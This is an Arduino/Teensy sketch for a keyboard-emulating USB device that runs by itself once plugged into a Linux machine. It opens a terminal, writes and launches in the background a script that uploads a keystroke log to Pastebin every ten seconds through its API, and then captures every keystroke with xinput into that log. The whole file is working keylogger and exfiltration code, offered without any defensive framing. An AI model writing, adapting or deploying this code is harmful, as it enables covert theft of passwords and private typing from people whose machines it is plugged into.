
void setup()
{
  delay(5000);
  terminal();
  delay(3000);

  Keyboard.println("echo while [ 1 ] > keylog.sh");
  delay(100);
  Keyboard.println("echo do >> keylog.sh");
  delay(100);
  Keyboard.println("echo sleep 10 >> keylog.sh");
  delay(100);
  Keyboard.println("echo out=\\`cat key.log\\` >> keylog.sh");
  delay(100);
  Keyboard.println("echo \"key=\\`curl -s -d \\\"api_dev_key=INPUT2&api_user_name=INPUT0&api_user_password=INPUT1\\\" http://pastebin.com/api/api_login.php\\`\" >> keylog.sh");
  delay(200);
  Keyboard.println("echo \"\\`curl -s -d \\\"api_user_key=\\$key&api_option=paste&api_dev_key=INPUT2&api_paste_name=Linux_Keylog&api_paste_code=\"\\$out\"&api_paste_private=2\\\" http://pastebin.com/api/api_post.php\\`\" >> keylog.sh");
  delay(200);
  Keyboard.println("echo done >> keylog.sh");
  delay(100);
  Keyboard.println("chmod +x keylog.sh");
  delay(100);
  Keyboard.println("sh keylog.sh &");
  delay(3000);
  terminal();
  delay(3000);
  Keyboard.println("keyid=`xinput --list | grep Translated | cut -d\"=\" -f2 | cut -d\"[\" -f1` ");
  delay(100);
  Keyboard.println("script -q -c \"xinput test $keyid\" -a key.log");
  delay(2000);
  //Keyboard.println("exit");
  
}

void loop()
{
   
}

void terminal()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  delay(100);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now(); 

}


